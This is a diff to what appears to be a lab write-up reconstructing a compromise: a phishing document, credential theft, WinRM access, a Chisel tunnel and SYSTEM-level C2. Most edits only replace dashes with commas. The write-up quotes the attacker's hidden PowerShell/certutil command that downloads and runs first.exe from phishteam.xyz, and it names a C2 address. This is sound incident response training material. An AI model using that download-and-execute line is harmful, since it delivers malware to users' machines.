@@ -14,7 +14,7 @@
 
 ## 📌 Scenario
 
-A machine has been compromised. As the **Incident Responder**, my task was to analyze captured artifacts from the affected system — tracing the attacker's actions from the moment of initial access through to full machine ownership.
+A machine has been compromised. As the **Incident Responder**, my task was to analyze captured artifacts from the affected system, tracing the attacker's actions from the moment of initial access through to full machine ownership.
 
 This is not a single-alert investigation. It is a complete kill chain reconstruction: every phase of the attack documented, every artifact verified, every tool identified.
 
@@ -36,7 +36,7 @@ This is not a single-alert investigation. It is a complete kill chain reconstruc
 
 ## 🔐 Phase 0 — File Integrity Verification (Hashing)
 
-Before any analysis begins, the integrity of every provided artifact must be verified. A tampered or corrupted artifact produces unreliable findings — inadmissible in a real incident response engagement.
+Before any analysis begins, the integrity of every provided artifact must be verified. A tampered or corrupted artifact produces unreliable findings, inadmissible in a real incident response engagement.
 
 **Tool:** PowerShell
 **Algorithm:** SHA256
@@ -45,7 +45,7 @@ Before any analysis begins, the integrity of every provided artifact must be ver
 Get-FileHash -Algorithm SHA256 <file_location>
 ```
 
-SHA256 hashes were generated for all incident artifacts. Verified hashes confirm the files are unmodified since collection — establishing a clean, trustworthy evidence baseline for the full investigation.
+SHA256 hashes were generated for all incident artifacts. Verified hashes confirm the files are unmodified since collection, establishing a clean, trustworthy evidence baseline for the full investigation.
 
 ---
 
@@ -84,7 +84,7 @@ The document's purpose was to deceive the user into opening it, triggering execu
 
 ### Finding
 
-The document triggered a **PowerShell command** executed in hidden, non-interactive mode — a deliberate evasion technique to prevent a visible terminal window from alerting the user:
+The document triggered a **PowerShell command** executed in hidden, non-interactive mode, a deliberate evasion technique to prevent a visible terminal window from alerting the user:
 
 ```powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
@@ -158,11 +158,11 @@ The URL was **Base64-encoded** within the document — consistent with the encod
 
 ### Finding 1 — Sensitive File Discovery
 
-Wireshark analysis of internal traffic revealed the attacker accessed a file containing **credentials (passwords)**. Sensitive data was identified within packet captures — confirming the attacker was actively harvesting internal credentials.
+Wireshark analysis of internal traffic revealed the attacker accessed a file containing **credentials (passwords)**. Sensitive data was identified within packet captures, confirming the attacker was actively harvesting internal credentials.
 
 ### Finding 2 — Port Identification for Lateral Movement
 
-**Port 5985** was identified — this is the **WinRM (Windows Remote Management)** port, which provides remote PowerShell shell access. Knowing this port was open, the attacker had a clear lateral movement path.
+**Port 5985** was identified, this is the **WinRM (Windows Remote Management)** port, which provides remote PowerShell shell access. Knowing this port was open, the attacker had a clear lateral movement path.
 
 ### Finding 3 — Reverse SOCKS Proxy (Chisel)
 
@@ -180,11 +180,11 @@ SHA256: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
 
 **VirusTotal lookup → Tool identified: Chisel**
 
-Chisel is a legitimate network tunneling tool — weaponized here to create a covert communication channel between the compromised machine and the attacker's infrastructure at `167.71.199.191:8080`.
+Chisel is a legitimate network tunneling tool, weaponized here to create a covert communication channel between the compromised machine and the attacker's infrastructure at `167.71.199.191:8080`.
 
 ### Finding 4 — Credential-Based Authentication via WinRM
 
-Using the harvested credentials, the attacker authenticated to the machine over **WinRM** — the remote shell port identified in Finding 2. This gave the attacker interactive remote access without needing to exploit another vulnerability.
+Using the harvested credentials, the attacker authenticated to the machine over **WinRM**, the remote shell port identified in Finding 2. This gave the attacker interactive remote access without needing to exploit another vulnerability.
 
 ---
 
@@ -215,7 +215,7 @@ Following privilege escalation, the attacker downloaded and executed:
 Filename: final.exe
 ```
 
-`final.exe` established a new **C2 connection on port 8080** — now running under elevated SYSTEM privileges, giving the attacker full, unrestricted control of the machine.
+`final.exe` established a new **C2 connection on port 8080**, now running under elevated SYSTEM privileges, giving the attacker full, unrestricted control of the machine.
 
 ---
 
@@ -322,10 +322,10 @@ Even if the machine is rebooted or the active session ends, the attacker's C2 bi
 **Timeline Explorer — new tool, new logic**
 Timeline Explorer was completely new. Understanding how to navigate and filter its artifact view took deliberate time and patience before the investigation could move forward productively.
 
-**Resolution:** Worked through it methodically — learned the filter structure, understood what each column represented, and built familiarity by applying it to each phase rather than trying to learn it in isolation.
+**Resolution:** Worked through it methodically, learned the filter structure, understood what each column represented, and built familiarity by applying it to each phase rather than trying to learn it in isolation.
 
 **Brim — understanding what to look for**
-Brim's interface was intuitive, but the challenge was knowing *what* to search for within the PCAP — not the tool, but the investigative question.
+Brim's interface was intuitive, but the challenge was knowing *what* to search for within the PCAP, not the tool, but the investigative question.
 
 **Resolution:** Led with the known attacker domain (`phishteam.xyz`) as the initial filter, then expanded from there. Starting with a known indicator and widening the investigation is more effective than starting broad.
 
@@ -347,9 +347,9 @@ Brim's interface was intuitive, but the challenge was knowing *what* to search f
 
 ## 🌍 Real-World Application
 
-This capstone mirrors a real incident response engagement. In an actual compromise, an IR analyst receives collected artifacts from the affected machine and must reconstruct what happened — without a guided checklist.
+This capstone mirrors a real incident response engagement. In an actual compromise, an IR analyst receives collected artifacts from the affected machine and must reconstruct what happened without a guided checklist.
 
-The tools used here (Timeline Explorer, EvtxECmd, Brim, Wireshark) are real-world DFIR tools used by professional incident responders. The techniques observed — LOLBin abuse, Base64 obfuscation, reverse SOCKS proxying, SeImpersonatePrivilege exploitation, service-based persistence — appear in real APT campaigns and ransomware intrusions documented in threat intelligence reports.
+The tools used here (Timeline Explorer, EvtxECmd, Brim, Wireshark) are real-world DFIR tools used by professional incident responders. The techniques observed LOLBin abuse, Base64 obfuscation, reverse SOCKS proxying, SeImpersonatePrivilege exploitation, service-based persistence appear in real APT campaigns and ransomware intrusions documented in threat intelligence reports.
 
 Completing this capstone demonstrates the ability to: verify artifact integrity, reconstruct an attack timeline across multiple artifact types, identify attacker tools via hash intelligence, and produce a documented, evidence-backed incident report — the core deliverable of a professional incident response engagement.
 
